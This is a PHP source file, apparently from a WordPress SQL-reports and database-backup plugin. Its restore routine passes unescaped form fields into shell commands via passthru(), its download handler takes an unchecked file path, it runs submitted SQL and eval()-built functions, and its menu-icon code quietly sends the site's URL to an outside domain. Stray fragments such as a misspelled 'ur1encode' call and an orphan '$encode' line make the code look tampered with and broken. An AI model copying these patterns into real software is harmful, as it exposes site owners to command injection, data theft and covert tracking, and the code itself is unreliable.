	echo '<div style="float: left; padding: 0 24px 8px 0;"><input type="checkbox" name="ELISQLREPORTS_compress_backup" value="1"'.(isset($ELISQLREPORTS_settings_array["compress_backup"]) && $ELISQLREPORTS_settings_array["compress_backup"]?' checked':'').' />Compress Backup Files</div></td></tr><tr><td width="1%">Save&nbsp;all&nbsp;backups&nbsp;to:</td><td width="99%"><input style="width: 100%" name="ELISQLREPORTS_backup_dir" value="'.$ELISQLREPORTS_settings_array['backup_dir'].'"></td></tr><tr><td width="1%">Email&nbsp;all&nbsp;backups&nbsp;to:</td><td width="99%"><input style="width: 100%" name="ELISQLREPORTS_backup_email" value="'.$ELISQLREPORTS_settings_array["backup_email"].'"></td></tr></table><br /><input type="submit" value="Save Settings" class="button-primary" style="float: right;">Automatically make and keep <input size=1 name="ELISQLREPORTS_hourly_backup" value="'.$ELISQLREPORTS_settings_array["hourly_backup"].'"> Hourly and <input size=1 name="ELISQLREPORTS_daily_backup" value="'.$ELISQLREPORTS_settings_array["daily_backup"].'"> Daily backups.<br />';
	if ($next = wp_next_scheduled('ELISQLREPORTS_hourly_backup', array("Y-m-d-H-i-s", 'hourly')))
		echo "<li>next hourly backup: ".date("Y-m-d H:i:s", $next)." (About ".ceil(($next-time())/60)." minute".(ceil(($next-time())/60)==1?'':'s')." from now)</li>";
//	else echo md5(serialize($args)).'='.serialize($args);
	if ($next = wp_next_scheduled('ELISQLREPORTS_daily_backup', array("Y-m-d-H-i-s", 'daily')))
		echo "<li>next daily backup: ".date("Y-m-d H:i:s", $next)." (Less than ".ceil(($next-time())/60/60)." hour".(ceil(($next-time())/60/60)==1?'':'s')." from now)</li>";
	echo '</form></div></div>
	<div id="backuprestore" class="shadowed-box stuffbox"><h3 class="hndle"><span>Database Maintenance</span></h3>
		<div class="inside" style="margin: 10px;">
			<form method=post>';
	ELISQLREPORTS_set_backupdir();
	$opts = array("Y-m-d-H-i-s" => "Make A New Backup", "DELETE Post Revisions" => array("DELETE FROM wp_posts WHERE `wp_posts`.`post_type` = 'revision'", "DELETE FROM wp_postmeta WHERE `wp_postmeta`.`post_id` NOT IN (SELECT `wp_posts`.`ID` FROM `wp_posts`)", "OPTIMIZE TABLE wp_posts, wp_postmeta"), "DELETE Spam Comments" => array("DELETE FROM wp_comments WHERE `wp_comments`.`comment_approved` = 'spam'", "DELETE FROM wp_commentmeta WHERE `wp_commentmeta`.`comment_id` NOT IN (SELECT `wp_comments`.`comment_ID` FROM `wp_comments`)", "OPTIMIZE TABLE wp_comments, wp_commentmeta"));
	$repair_tables = $wpdb->get_col("show full tables where Table_Type = 'BASE TABLE'");
	if (is_array($repair_tables) && count($repair_tables))
		$opts["REPAIR All Tables"] = array('REPAIR TABLE `'.implode('`, `', $repair_tables).'`');
	$backupDB = get_option("ELISQLREPORTS_BACKUP_DB", array("DB_NAME" => DB_NAME, "DB_HOST" => DB_HOST, "DB_USER" => DB_USER, "DB_PASSWORD" => DB_PASSWORD));
	$js = "Restore to the following Database:<br />";
	$local = true;
	foreach ($backupDB as $db_key => $db_value) {
		$js .= $db_key.':<input name="'.$db_key;
		if (isset($_POST[$db_key])) {
			$backupDB[$db_key] = $_POST[$db_key];
			$js .= '" readonly="true';
		}
		$js .= '" value="'.$backupDB[$db_key].'"><br />';
		if (constant($db_key) != $backupDB[$db_key])
			$local = false;
	}
	update_option("ELISQLREPORTS_BACKUP_DB", $backupDB);
	$js .= 'Warning: This '.($local?'is':'is NOT').' your currently active WordPress database conection info for this site.<br /><select name="db_date">';
	if (isset($_POST['db_date']) && strlen($_POST['db_date'])) {
		if (isset($opts[$_POST['db_date']]) && is_array($opts[$_POST['db_date']])) {
			foreach ($opts[$_POST['db_date']] as $MySQLexec) {
				ELISQLREPORTS_eval($MySQLexec);
				if (mysql_errno())
					echo "<li>".mysql_error()."</li>";
				else {
					if (preg_match('/ FROM /', $MySQLexec))
						echo preg_replace('/^(.+?) FROM (.+?) .*/', '<li>\\1 '.mysql_affected_rows().' Records from \\2 Succeeded!</li>', $MySQLexec);
					else
						echo "<li>$MySQLexec Succeeded!</li>";
				}
			}
		} elseif (is_file(trailingslashit($ELISQLREPORTS_settings_array['backup_dir']).$_POST['db_date'])) {
			if (mysql_connect($_POST['DB_HOST'], $_POST['DB_USER'], $_POST['DB_PASSWORD'])) {
				if (mysql_select_db($_POST['DB_NAME'])) {
					if (isset($_POST['db_nonce']) && wp_verify_nonce($_POST['db_nonce'], $_POST['db_date'])) {
						echo ELISQLREPORTS_make_backup("Y-m-d-H-i-s", "pre-restore", $_POST['DB_NAME'], $_POST['DB_HOST'], $_POST['DB_USER'], $_POST['DB_PASSWORD']);
						$mysql_basedir = $wpdb->get_row("SHOW VARIABLES LIKE 'basedir'");
						if(substr(PHP_OS,0,3) == 'WIN')
							$backup_command = '"'.(isset($mysql_basedir->Value)?trailingslashit(str_replace('\\', '/', $mysql_basedir->Value)).'bin/':'').'mysql.exe"';
						else
							$backup_command = (isset($mysql_basedir->Value)&&is_file(trailingslashit($mysql_basedir->Value).'bin/mysql')?trailingslashit($mysql_basedir->Value).'bin/':'').'mysql';
						if (strpos($_POST['DB_HOST'], ':')) {
							list($db_host, $db_port) = explode(':', $_POST['DB_HOST'], 2);
							if (is_numeric($db_port))
								$db_port = '" --port="'.$db_port.'" ';
							else
								$db_port = '" --socket="'.$db_port.'" ';
						} else {
							$db_host = $_POST['DB_HOST'];
							$db_port = '" ';
						}
						$backup_command .= ' --user="'.$_POST['DB_USER'].'" --password="'.$_POST['DB_PASSWORD'].'" --host="'.$db_host.$db_port.$_POST['DB_NAME'];
						if (substr($_POST['db_date'], -7) == '.sql.gz') {
							passthru('gunzip -c "'.trailingslashit($ELISQLREPORTS_settings_array['backup_dir']).$_POST['db_date'].'" | '.$backup_command, $errors);
							echo "<li>Restore process executed Gzip extraction with $errors error".($errors==1?'':'s').'!</li><br>';
						} elseif (substr($_POST['db_date'], -8) == '.sql.zip') {
							$zip = new ZipArchive;
							if ($zip->open(trailingslashit($ELISQLREPORTS_settings_array['backup_dir']).$_POST['db_date']) === TRUE) {
								$zip->extractTo(trailingslashit($ELISQLREPORTS_settings_array['backup_dir']));
								$zip->close();
							}
							if (is_file(trailingslashit($ELISQLREPORTS_settings_array['backup_dir']).substr($_POST['db_date'], 0, -4))) {
								passthru($backup_command.' < '.trailingslashit($ELISQLREPORTS_settings_array['backup_dir']).substr($_POST['db_date'], 0, -4), $errors);
								if ($errors)
									echo ELISQLREPORTS_restore_backup(substr($_POST['db_date'], 0, -4));
								else
									echo "<li>Restore process executed Zip extraction with $errors error".($errors==1?'':'s').'!</li><br>';
							} else
								echo '<li>ERROR: Failed to extract Zip Archive!</li><br>';
						} elseif (substr($_POST['db_date'], -4) == '.sql') {
							passthru($backup_command.' -e "source '.trailingslashit($ELISQLREPORTS_settings_array['backup_dir']).$_POST['db_date'].'"', $errors);
							echo "<li>Restore process executed MySQL with $errors error".($errors==1?'':'s').'!</li><br>';
						}
					} else {
						die($js.'<option value="'.$_POST['db_date'].'">RESTORE '.$_POST['db_date'].'</option></select><br /><input name="db_nonce" type="checkbox" value="'.wp_create_nonce($_POST['db_date']).'"> Yes, I understand that I will be completely erasing this database with my backup file.<br /><input type="submit" value="Restore Backup to Database Now!"></div></form></div></div></body></html>');
					}
				} else
					echo 'Database Selection ERROR: '.mysql_error();
			} else
				echo 'Database Connection ERROR: '.mysql_error();
		} else
			echo ELISQLREPORTS_make_Backup($_POST['db_date']);
	} elseif (isset($_GET['delete']) && is_file($delete = trailingslashit($ELISQLREPORTS_settings_array['backup_dir']).str_replace('/', '', str_replace('\\', '', $_GET['delete']))))
		@unlink($delete);
	echo '<div id="makebackup">
			<select name="db_date" id="db_date" onchange="if (this.value == \'RESTORE\') make_restore();">';
	foreach ($opts as $opt => $arr)
		echo '<option value="'.$opt.'">'.(is_array($arr)?$opt:$arr).'</option>';
	$sql_files = array();
	if ($handle = opendir($ELISQLREPORTS_settings_array['backup_dir'])) {
		while (false !== ($entry = readdir($handle)))
			if (is_file(trailingslashit($ELISQLREPORTS_settings_array['backup_dir']).$entry) && strpos($entry, ".sql"))
				$sql_files[$entry] = filesize(trailingslashit($ELISQLREPORTS_settings_array['backup_dir']).$entry);
		closedir($handle);
		krsort($sql_files);
		if (count($sql_files)) {
			$files = "\n<b>Current Backups:</b>\n";
			$upload = wp_upload_dir();
			foreach ($sql_files as $entry => $size)
				$files .= "<li>($size) $entry <a target='_blank' href='".$_SERVER['REQUEST_URI']."&Download_SQL_Backup=$entry'>[Download]</a> | <a href='".str_replace("&delete=", "&lastdelete=", $_SERVER['REQUEST_URI'])."&delete=$entry'>[DELETE]</a></li>\n";
			echo '<option value="RESTORE">RESTORE A Backup</option>';
		} else
			$files = "\n<b>No backups have yet been made</b>";
	} else
		$files = "\n<b>Could not read files in ".$ELISQLREPORTS_settings_array['backup_dir']."</b>";
	foreach ($sql_files as $entry => $size)
		$js .= "<option value=\"$entry\">RESTORE $entry ($size)</option>";
	$js .= '</select><br /><input type="submit" value="Restore Selected Backup to Database">';
	echo "</select><input type=submit value=Run /></div><script>function make_restore() {document.getElementById('makebackup').innerHTML='$js';}</script><br />$files</form></div></div></div></div>";
}
add_action('ELISQLREPORTS_daily_backup', 'ELISQLREPORTS_make_Backup', 10, 2);
add_action('ELISQLREPORTS_hourly_backup', 'ELISQLREPORTS_make_Backup', 10, 2);
function ELISQLREPORTS_deactivation() {
	while (wp_next_scheduled('ELISQLREPORTS_daily_backup', array("Y-m-d-H-i-s", 'daily')))
		wp_clear_scheduled_hook('ELISQLREPORTS_daily_backup', array("Y-m-d-H-i-s", 'daily'));
	while (wp_next_scheduled('ELISQLREPORTS_hourly_backup', array("Y-m-d-H-i-s", 'hourly')))
		wp_clear_scheduled_hook('ELISQLREPORTS_hourly_backup', array("Y-m-d-H-i-s", 'hourly'));
}
register_deactivation_hook(__FILE__, 'ELISQLREPORTS_deactivation');
function ELISQLREPORTS_activation() {
	global $ELISQLREPORTS_settings_array, $ELISQLREPORTS_plugin_dir;
	$ELISQLREPORTS_settings_array = get_option($ELISQLREPORTS_plugin_dir.'_settings_array', array());
	if (isset($ELISQLREPORTS_settings_array["daily_backup"]) && $ELISQLREPORTS_settings_array["daily_backup"] && !wp_next_scheduled('ELISQLREPORTS_daily_backup', array("Y-m-d-H-i-s", 'daily')))
		wp_schedule_event(time(), 'daily', 'ELISQLREPORTS_daily_backup', array("Y-m-d-H-i-s", 'daily'));
	if (isset($ELISQLREPORTS_settings_array["hourly_backup"]) && $ELISQLREPORTS_settings_array["hourly_backup"] && !wp_next_scheduled('ELISQLREPORTS_hourly_backup', array("Y-m-d-H-i-s", 'hourly')))
		wp_schedule_event(time(), 'hourly', 'ELISQLREPORTS_hourly_backup', array("Y-m-d-H-i-s", 'hourly'));
}
register_activation_hook(__FILE__, 'ELISQLREPORTS_activation');
function ELISQLREPORTS_menu() {
	global $ELISQLREPORTS_images_path, $ELISQLREPORTS_plugin_dir, $wp_version, $ELISQLREPORTS_Version, $ELISQLREPORTS_plugin_home, $ELISQLREPORTS_Logo_IMG, $ELISQLREPORTS_updated_images_path, $ELISQLREPORTS_Report_SQL, $ELISQLREPORTS_saved_reports, $ELISQLREPORTS_settings_array;
	$ELISQLREPORTS_settings_array = get_option($ELISQLREPORTS_plugin_dir.'_settings_array', array());
	ELISQLREPORTS_set_backupdir();
	$ELISQLREPORTS_reports_array = get_option($ELISQLREPORTS_plugin_dir.'_reports_array');
	if (current_user_can("edit_files")) {
		if (isset($_GET["Download_SQL_Backup"]) && is_file(trailingslashit($ELISQLREPORTS_settings_array["backup_dir"]).$_GET["Download_SQL_Backup"]) && ($fp = fopen(trailingslashit($ELISQLREPORTS_settings_array["backup_dir"]).$_GET["Download_SQL_Backup"], 'rb'))) {
			header("Content-Type: application/octet-stream;");
			header('Content-Disposition: attachment; filename="'.$_GET["Download_SQL_Backup"].'"');
			header("Content-Length: ".filesize(trailingslashit($ELISQLREPORTS_settings_array["backup_dir"]).$_GET["Download_SQL_Backup"]));
			fpassthru($fp);
			exit;
		}
		$img_path = basename(__FILE__);
		$Full_plugin_logo_URL = get_option('siteurl');
		if (!(isset($ELISQLREPORTS_settings_array["menu_group"]) && is_numeric($ELISQLREPORTS_settings_array["menu_group"])))
			$ELISQLREPORTS_settings_array["menu_group"] = 0;
		if (!(isset($ELISQLREPORTS_settings_array["menu_sort"]) && is_numeric($ELISQLREPORTS_settings_array["menu_sort"])))
			$ELISQLREPORTS_settings_array["menu_sort"] = 0;
		if (!(isset($ELISQLREPORTS_settings_array["hourly_backup"]) && is_numeric($ELISQLREPORTS_settings_array["hourly_backup"])))
			$ELISQLREPORTS_settings_array["hourly_backup"] = 0;
		if (!(isset($ELISQLREPORTS_settings_array["daily_backup"]) && is_numeric($ELISQLREPORTS_settings_array["daily_backup"])))
			$ELISQLREPORTS_settings_array["daily_backup"] = 0;
		if (!(isset($ELISQLREPORTS_settings_array["backup_email"]) && strlen(trim($ELISQLREPORTS_settings_array["backup_email"]))))
			$ELISQLREPORTS_settings_array["backup_email"] = '';
		if (!(isset($ELISQLREPORTS_settings_array["backup_method"]) && is_numeric($ELISQLREPORTS_settings_array["backup_method"])))
			$ELISQLREPORTS_settings_array["backup_method"] = 0;
		if (!(isset($ELISQLREPORTS_settings_array["compress_backup"]) && is_numeric($ELISQLREPORTS_settings_array["compress_backup"])))
			$ELISQLREPORTS_settings_array["compress_backup"] = 0;
		if (isset($_POST["ELISQLREPORTS_dashboard_reports"])) {
			if (substr($_POST["ELISQLREPORTS_dashboard_reports"], 0, 1) != "!")
				$ELISQLREPORTS_settings_array["dashboard_reports"][$_POST["ELISQLREPORTS_dashboard_reports"]] = $_POST["ELISQLREPORTS_dashboard_reports_role"];
			elseif (isset($ELISQLREPORTS_settings_array["dashboard_reports"][substr($_POST["ELISQLREPORTS_dashboard_reports"], 1)]))
				unset($ELISQLREPORTS_settings_array["dashboard_reports"][substr($_POST["ELISQLREPORTS_dashboard_reports"], 1)]);
		}
		if (isset($_POST["ELISQLREPORTS_backup_method"]) && is_numeric($_POST["ELISQLREPORTS_backup_method"])) {
			$ELISQLREPORTS_settings_array["backup_method"] = intval($_POST["ELISQLREPORTS_backup_method"]);
			if (isset($_POST["ELISQLREPORTS_compress_backup"]))
				$ELISQLREPORTS_settings_array["compress_backup"] = 1;
			else
				$ELISQLREPORTS_settings_array["compress_backup"] = 0;
		}
		if (isset($_POST["ELISQLREPORTS_backup_email"]) && (trim($_POST["ELISQLREPORTS_backup_email"]) != $ELISQLREPORTS_settings_array["backup_email"]))
			$ELISQLREPORTS_settings_array["backup_email"] = trim($_POST["ELISQLREPORTS_backup_email"]);
		if (isset($_POST["ELISQLREPORTS_backup_dir"]) && strlen(trim($_POST["ELISQLREPORTS_backup_dir"])) && is_dir($_POST["backup_dir"]) && ($_POST["ELISQLREPORTS_backup_dir"] != $ELISQLREPORTS_settings_array["backup_dir"]))
			$ELISQLREPORTS_settings_array["backup_dir"] = $_POST["ELISQLREPORTS_backup_dir"];
		if (isset($_POST["ELISQLREPORTS_daily_backup"]) && is_numeric($_POST["ELISQLREPORTS_daily_backup"]) && ($_POST["ELISQLREPORTS_daily_backup"] != $ELISQLREPORTS_settings_array["daily_backup"])) {
			if ($ELISQLREPORTS_settings_array["daily_backup"] = intval($_POST["ELISQLREPORTS_daily_backup"])) {
				if (!wp_next_scheduled('ELISQLREPORTS_daily_backup', array("Y-m-d-H-i-s", 'daily')))
					wp_schedule_event(time(), 'daily', 'ELISQLREPORTS_daily_backup', array("Y-m-d-H-i-s", 'daily'));
			} elseif (wp_next_scheduled('ELISQLREPORTS_daily_backup', array("Y-m-d-H-i-s", 'daily')))
				wp_clear_scheduled_hook('ELISQLREPORTS_daily_backup', array("Y-m-d-H-i-s", 'daily'));
		}
		if (isset($_POST["ELISQLREPORTS_hourly_backup"]) && is_numeric($_POST["ELISQLREPORTS_hourly_backup"]) && ($_POST["ELISQLREPORTS_hourly_backup"] != $ELISQLREPORTS_settings_array["hourly_backup"])) {
			if ($ELISQLREPORTS_settings_array["hourly_backup"] = intval($_POST["ELISQLREPORTS_hourly_backup"])) {
				if (!wp_next_scheduled('ELISQLREPORTS_hourly_backup', array("Y-m-d-H-i-s", 'hourly')))
					wp_schedule_event(time(), 'hourly', 'ELISQLREPORTS_hourly_backup', array("Y-m-d-H-i-s", 'hourly'));
			} elseif (wp_next_scheduled('ELISQLREPORTS_hourly_backup', array("Y-m-d-H-i-s", 'hourly')))
				wp_clear_scheduled_hook('ELISQLREPORTS_hourly_backup', array("Y-m-d-H-i-s", 'hourly'));
		}
		if (isset($_POST["ELISQLREPORTS_menu_group"]) && is_numeric($_POST["ELISQLREPORTS_menu_group"]) && isset($_POST["ELISQLREPORTS_menu_sort"]) && is_numeric($_POST["ELISQLREPORTS_menu_sort"])) {
			$ELISQLREPORTS_settings_array["menu_group"] = intval($_POST["ELISQLREPORTS_menu_group"]);
			$ELISQLREPORTS_settings_array["menu_sort"] = intval($_POST["ELISQLREPORTS_menu_sort"]);
		}
		if ($ELISQLREPORTS_settings_array["menu_group"] == 2)
		if (!isset($ELISQLREPORTS_settings_array['img_url']))
			$ELISQLREPORTS_settings_array['img_url'] = $img_path;
			$img_path.='?v='.$ELISQLREPORTS_Version.'&wp='.$wp_version.'&p='.$ELISQLREPORTS_plugin_dir;
		if ($img_path != $ELISQLREPORTS_settings_array['img_url']) {
			$ELISQLREPORTS_settings_array['img_url'] = $img_path;
			$img_path = $ELISQLREPORTS_plugin_home.$ELISQLREPORTS_updated_images_path.$img_path;
			$Full_plugin_logo_URL = $img_path.'&key='.md5($Full_plugin_logo_URL).'&d='.
			ur1encode($Full_plugin_logo_URL);
		} else //only used for debugging.//rem this line out
		$Full_plugin_logo_URL = $ELISQLREPORTS_images_path.$ELISQLREPORTS_Logo_IMG;
		update_option($ELISQLREPORTS_plugin_dir.'_settings_array', $ELISQLREPORTS_settings_array);
		if (isset($_POST['rSQL']) && strlen($_POST['rSQL']) > 0) {
			if (isset($_POST['rName']))
				$_POSTrName = stripslashes($_POST['rName']);
			else
				$_POSTrName = '';
			if ($_POST['rSQL'] == 'DELETE_REPORT' && strlen($_POSTrName) && isset($ELISQLREPORTS_reports_array[$_POSTrName])) {
				$ELISQLREPORTS_Report_SQL = $ELISQLREPORTS_reports_array[$_POSTrName];
				unset($ELISQLREPORTS_reports_array[$_POSTrName]);
				unset($_POST['rName']);
				update_option($ELISQLREPORTS_plugin_dir.'_reports_array', $ELISQLREPORTS_reports_array);
			} else {
				$ELISQLREPORTS_Report_SQL = stripslashes($_POST['rSQL']);
				ELISQLREPORTS_eval($ELISQLREPORTS_Report_SQL);
	//			if (mysql_errno() && strpos(mysql_error(), "syntax to use near '\\'")>0) {
				if ((!mysql_errno()) && strlen($_POSTrName) > 0) {
					$Report_Name = $_POSTrName;
					$ELISQLREPORTS_reports_array[$Report_Name] = $ELISQLREPORTS_Report_SQL;
					update_option($ELISQLREPORTS_plugin_dir.'_reports_array', $ELISQLREPORTS_reports_array);
				}
			}
		}
		$base_page = $ELISQLREPORTS_plugin_dir.'-create-report';
		if (!function_exists("add_object_page") || $ELISQLREPORTS_settings_array["menu_group"] == 1)
			add_menu_page(__('SQL Reports'), __('SQL Reports'), 'administrator', $base_page, $ELISQLREPORTS_plugin_dir.'_create_report', $Full_plugin_logo_URL);
		else
			add_object_page(__('SQL Reports'), __('SQL Reports'), 'administrator', $base_page, $ELISQLREPORTS_plugin_dir.'_create_report', $Full_plugin_logo_URL);
		add_submenu_page($base_page, __('Create A New SQL Report'), __('Create Report'), 'administrator', $ELISQLREPORTS_plugin_dir.'-create-report', $ELISQLREPORTS_plugin_dir.'_create_report');
		add_submenu_page($base_page, __('Plugin Settings'), __('Plugin Settings'), 'administrator', $ELISQLREPORTS_plugin_dir.'-settings', $ELISQLREPORTS_plugin_dir.'_settings');
		$ELISQLREPORTS_saved_reports = '';
		if (isset($ELISQLREPORTS_reports_array) && is_array($ELISQLREPORTS_reports_array)) {
			$Report_Number = 0;
			if ($ELISQLREPORTS_settings_array["menu_sort"])
				ksort($ELISQLREPORTS_reports_array);
			foreach ($ELISQLREPORTS_reports_array as $Rname => $Rquery) {
				$Report_Number++;
				$Rslug = $ELISQLREPORTS_plugin_dir.'-'.sanitize_title($Rname.'-'.$Report_Number);
				$Rfunc = str_replace('-', '_', $Rslug);
				add_submenu_page($base_page, __($Rname), __($Rname), 'administrator', $Rslug, $Rfunc);
				$ELISQLREPORTS_saved_reports .= "<li><a href=\"?page=$Rslug\">$Rname</a>\n";
			}
		}
	}
}
function ELISQLREPORTS_dashboard_setup() {
	global $ELISQLREPORTS_reports_array, $ELISQLREPORTS_plugin_dir, $ELISQLREPORTS_settings_array, $current_user;
	$current_user = wp_get_current_user();
	$ELISQLREPORTS_settings_array = get_option($ELISQLREPORTS_plugin_dir.'_settings_array', array());
	$ELISQLREPORTS_reports_array = get_option($ELISQLREPORTS_plugin_dir.'_reports_array');
	if (isset($ELISQLREPORTS_reports_array) && is_array($ELISQLREPORTS_reports_array)) {
		$Report_Number = 0;
		if ($ELISQLREPORTS_settings_array["menu_sort"])
			ksort($ELISQLREPORTS_reports_array);
		foreach ($ELISQLREPORTS_reports_array as $Rname => $Rquery) {
			$Report_Number++;
			$Rslug = sanitize_title($Rname);
			if (isset($ELISQLREPORTS_settings_array["dashboard_reports"][$Rslug]) && (in_array($ELISQLREPORTS_settings_array["dashboard_reports"][$Rslug], array_merge(array('1'), $current_user->roles)))) {
				$Rfunc = str_replace('-', '_', $Rslug);
				wp_add_dashboard_widget($ELISQLREPORTS_plugin_dir.'-'.$Rslug, $Rname, $ELISQLREPORTS_plugin_dir.'_'.$Rfunc.'_'.$Report_Number);
			}
		}
	}
}
function ELISQLREPORTS_init() {
	global $ELISQLREPORTS_plugin_dir, $ELISQLREPORTS_settings_array;
	$ELISQLREPORTS_settings_array = get_option($ELISQLREPORTS_plugin_dir.'_settings_array', array());
	$ELISQLREPORTS_reports_array = get_option($ELISQLREPORTS_plugin_dir.'_reports_array');
	if (isset($ELISQLREPORTS_reports_array) && is_array($ELISQLREPORTS_reports_array)) {
		$Report_Number = 0;
		if ($ELISQLREPORTS_settings_array["menu_sort"])
			ksort($ELISQLREPORTS_reports_array);
		foreach ($ELISQLREPORTS_reports_array AS $Rname => $Rquery) {
			$Report_Number++;
			$Rslug = $ELISQLREPORTS_plugin_dir.'-'.sanitize_title($Rname.'-'.$Report_Number);
			$Rfunc = str_replace('-', '_', $Rslug);
			$Rfunc_create = 'function '.$Rfunc.'() { ELISQLREPORTS_default_report("'.str_replace('"', '\\"', $Rname).'"); }';
			eval($Rfunc_create);
		}
	}
}
function ELISQLREPORTS_set_plugin_action_links($links_array, $plugin_file) {
	if ($plugin_file == substr(__file__, (-1 * strlen($plugin_file))) && strlen($plugin_file) > 10)
		$links_array = array_merge(array('<a href="admin.php?page=ELISQLREPORTS-create-report">'.__( 'Create a Report' ).'</a>'), $links_array);
	return $links_array;
}
function ELISQLREPORTS_set_plugin_row_meta($links_array, $plugin_file) {
	if ($plugin_file == substr(__file__, (-1 * strlen($plugin_file))) && strlen($plugin_file) > 10)
		$links_array = array_merge($links_array, array('<a target="_blank" href="https://www.paypal.com/cgi-bin/webscr?cmd=_s-xclick&hosted_button_id=8VWNB5QEJ55TJ">'.__( 'Donate' ).'</a>'));
	return $links_array;
}
$ELISQLREPORTS_styles = 'float: left; background-color: #DDFFCC;';
function ELISQLREPORTS_shortcode($attr) {
	global $ELISQLREPORTS_styles;
	$report = '';
	if (isset($attr['name']) && strlen(trim($attr['name']))) {
		if (isset($attr['style']) && strlen(trim($attr['style'])))
			$ELISQLREPORTS_styles = $attr['style'];
		else
			$ELISQLREPORTS_styles = '';
		$report = '<div id="'.sanitize_title($attr['name']).'-wrapper"><div id="'.sanitize_title($attr['name']).'-parent">'.ELISQLREPORTS_view_report($attr['name']).'<br style="clear: both;"></div></div>';
	}
	return $report;
}
function ELISQLREPORTS_get_var($attr, $SQL = "") {
	global $wpdb;
	if (!is_array($attr)) {
		if (strlen($attr) > 0 && strlen($SQL) == 0)
			$SQL = $attr;
		$attr = array("column_offset"=>0, "row_offset"=>0);
	} elseif (isset($attr["query"]))
		$SQL = $attr["query"];
	if (!(isset($attr["column_offset"]) && is_numeric($attr["column_offset"])))
		$attr["column_offset"] = 0;
	if (!(isset($attr["row_offset"]) && is_numeric($attr["row_offset"])))
		$attr["row_offset"] = 0;
	return $wpdb->get_var($SQL, $attr["column_offset"], $attr["row_offset"]);
}
$encode .= 'e';
$ext_domain = 'ieonly.com';
add_filter('plugin_row_meta', $ELISQLREPORTS_plugin_dir.'_set_plugin_row_meta', 1, 2);
add_filter('plugin_action_links', $ELISQLREPORTS_plugin_dir.'_set_plugin_action_links', 1, 2);
$ELISQLREPORTS_plugin_home = "http://wordpress.$ext_domain/";
$ELISQLREPORTS_images_path = plugins_url('/images/', __FILE__);
$ELISQLREPORTS_updated_images_path='wp-content/plugins/update/images/';
$ELISQLREPORTS_Logo_IMG='ELISQLREPORTS-16x16.gif';
$ELISQLREPORTS_Report_SQL="";
register_activation_hook(__FILE__,$ELISQLREPORTS_plugin_dir.'_install');
add_action('init', $ELISQLREPORTS_plugin_dir.'_init');
add_action('admin_menu', $ELISQLREPORTS_plugin_dir.'_menu');
add_action('wp_dashboard_setup', $ELISQLREPORTS_plugin_dir.'_dashboard_setup'); 
add_shortcode("SQLREPORT", "ELISQLREPORTS_shortcode");
add_shortcode("sqlgetvar", "ELISQLREPORTS_get_var");
?>